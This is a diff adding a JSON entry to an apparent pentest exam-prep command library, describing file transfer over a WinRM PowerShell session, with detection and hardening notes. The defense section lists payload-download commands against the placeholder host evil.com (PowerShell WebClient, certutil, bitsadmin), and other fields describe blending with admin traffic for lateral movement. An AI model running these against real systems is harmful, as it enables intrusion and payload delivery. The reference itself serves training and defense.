@@ -1,0 +1,130 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [
+    "winrm"
+  ],
+  "tools": [
+    "powershell"
+  ],
+  "tags": [
+    "winrm",
+    "ps-session",
+    "copy-item"
+  ],
+  "category": "File Transfers",
+  "subcategory": "RDP & WinRM",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 07: File Transfers",
+  "examples": [
+    {
+      "label": "CPTS Ch07 — copy file to remote host via PSSession",
+      "command": "$Session = New-PSSession -ComputerName DATABASE01\nCopy-Item -Path C:\\samplefile.txt -ToSession $Session -Destination C:\\Users\\Administrator\\Desktop\\"
+    },
+    {
+      "label": "Retrieve file from remote host",
+      "command": "Copy-Item -Path 'C:\\Users\\Administrator\\Desktop\\DATABASE.txt' -Destination C:\\ -FromSession $Session"
+    }
+  ],
+  "notes": "With a WinRM session, `Copy-Item -ToSession $s` / `-FromSession $s` moves files over the existing 5985/5986 channel - clean and native once you have creds. PSSession file transfers work over WinRM (port 5985/5986). Requires PowerShell remoting enabled on target. Blends with legitimate admin traffic. Also useful for lateral movement in AD environments. Also covered in: CPTS Ch07 (File Transfers).",
+  "references": [
+    {
+      "title": "HTB Academy - File Transfers",
+      "url": "https://academy.hackthebox.com/module/details/24"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "rdp-drive-mount",
+      "rel": "alternative",
+      "note": "RDP drive redirection."
+    },
+    {
+      "id": "ad-wmi-cim-exec",
+      "rel": "next",
+      "note": "Continue enumeration/technique in this area"
+    }
+  ],
+  "id": "winrm-ps-session",
+  "name": "WinRM - Copy via PowerShell Session",
+  "command": "Copy-Item -Path C:\\file.txt -ToSession $Session -Destination C:\\Users\\Administrator\\Desktop\\",
+  "description": "With a PowerShell Remoting (WinRM) session you can copy files to or from the remote host directly over the session - no separate server needed.",
+  "steps": [
+    {
+      "label": "1. Test WinRM reachability",
+      "command": "Test-NetConnection -ComputerName DATABASE01 -Port 5985"
+    },
+    {
+      "label": "2. Open a session",
+      "command": "$Session = New-PSSession -ComputerName DATABASE01"
+    },
+    {
+      "label": "3. Copy to / from the session",
+      "command": "Copy-Item -Path C:\\samplefile.txt -ToSession $Session -Destination C:\\Users\\Administrator\\Desktop\\\nCopy-Item -Path \"C:\\Users\\Administrator\\Desktop\\DATABASE.txt\" -Destination C:\\ -FromSession $Session"
+    }
+  ],
+  "opsec": "quiet",
+  "mitre": [
+    "T1105"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "An authenticated WinRM PowerShell session (Enter-PSSession / Copy-Item -ToSession) transfers files to a remote Windows host over WinRM (5985/5986) - a native remote-management channel.",
+    "prerequisites": "Valid credentials with WinRM access to the target and WinRM enabled/reachable.",
+    "impact": "Files staged on the remote host via a trusted management protocol, often as part of lateral movement.",
+    "detection": "WinRM logons (Event 4624 type 3 to 5985/5986) and PowerShell remoting operations; Copy-Item -ToSession and remoting cmdlets in script-block logs (4104); new file on the target.",
+    "artifacts": "WinRM connection on 5985/5986; 4104 remoting entries; the transferred file; the authenticating account in 4624.",
+    "prevention": "Restrict WinRM to management subnets/jump hosts; strong credential hygiene (WinRM needs valid creds); monitor remoting and Copy-Item -ToSession; JEA to constrain what remoting can do.",
+    "evasion": "WinRM is a legitimate admin channel, so with valid creds the transfer blends with normal management; traffic is encrypted (HTTPS on 5986).",
+    "sources": [
+      "HTB M07",
+      "MITRE T1105"
+    ],
+    "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
+    "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
+    "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering — block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
+  },
+  "variations": [
+    {
+      "description": "Check WinRM port reachability (5985=HTTP, 5986=HTTPS)",
+      "command": "Test-NetConnection -ComputerName <hostname> -Port 5985",
+      "label": "Test-NetConnection"
+    },
+    {
+      "description": "Create PSSession to remote host",
+      "command": "$Session = New-PSSession -ComputerName <hostname>",
+      "label": "$Session = New-PSSession -Computer…"
+    },
+    {
+      "description": "Copy file TO remote session",
+      "command": "Copy-Item -Path C:\\<local_file> -ToSession $Session -Destination C:\\Users\\Administrator\\Desktop\\",
+      "label": "Copy-Item -Path C:\\<local_file> -T…"
+    },
+    {
+      "description": "Copy file FROM remote session",
+      "command": "Copy-Item -Path 'C:\\Users\\Administrator\\Desktop\\<remote_file>' -Destination C:\\ -FromSession $Session",
+      "label": "Copy-Item -Path 'C:\\Users\\Administ…"
+    },
+    {
+      "description": "Enter interactive PSSession",
+      "command": "Enter-PSSession -Session $Session",
+      "label": "Enter-PSSession"
+    },
+    {
+      "description": "Full WinRM file transfer workflow (check → connect → copy)",
+      "command": "Test-NetConnection -ComputerName DATABASE01 -Port 5985\n$Session = New-PSSession -ComputerName DATABASE01\nCopy-Item -Path C:\\samplefile.txt -ToSession $Session -Destination C:\\Users\\Administrator\\Desktop\\",
+      "label": "Test-NetConnection"
+    }
+  ]
+}
